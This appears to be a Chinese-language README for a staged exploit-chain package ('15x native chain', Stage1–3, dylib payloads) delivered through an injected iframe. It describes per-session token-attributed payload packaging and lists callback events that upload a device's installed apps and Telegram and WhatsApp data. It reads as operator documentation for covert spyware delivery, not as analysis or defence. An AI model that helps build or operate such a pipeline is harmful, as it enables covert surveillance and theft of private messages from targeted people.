# device-callback-15（iframe-c）

15x 原生链集成包。`type: "iframe-c"`——服务端按请求现场打包交付（会话专属文件名归因，无 IP 回退）。

## 平台约定（iframe-c）

1. 入口 `index.html` 与 iframe 集成相同（注入 bridge v3）；
2. 页面会调用 `POST /api/public/promotion/integrations/{integrationId}/{revision}/issue`，body `{"base":"<40hex>","contextId":"<eventId>"}`，响应 `{"fileName":"<base>.<token>.min.js"}`；
3. 客户端随后按 `fileName` 请求 per-class，服务端凭 token 归因、现场打包下发；无 token/无效/过期 → 404；
4. 打包所需两个资产在本包内：
   - `per_class_files.json`：`[{"file":"<40hex>.min.js","key":"<64hex>","entries":[{"size":N}]}]`
   - `payload_template.dylib`：含 0x43524731 配置段魔数的模板二进制

完整实施规格见平台仓库 `docs/integration-type-iframe-c.md`。

## 包内容

- 页面/链：index.html、router.js、chain_main.js、platform_module.js、utility_module.js、Stage1×3、Stage2×1、Stage3×2、7a7d 索引
- payloads/：20 组容器条目 + manifest.json + 7a7d raw.bin + bootstrap.dylib
- 打包资产：per_class_files.json、payload_template.dylib

## 回传事件

device_activate / device_apps / telegram_upload / whatsapp_upload（标准 events 契约）。
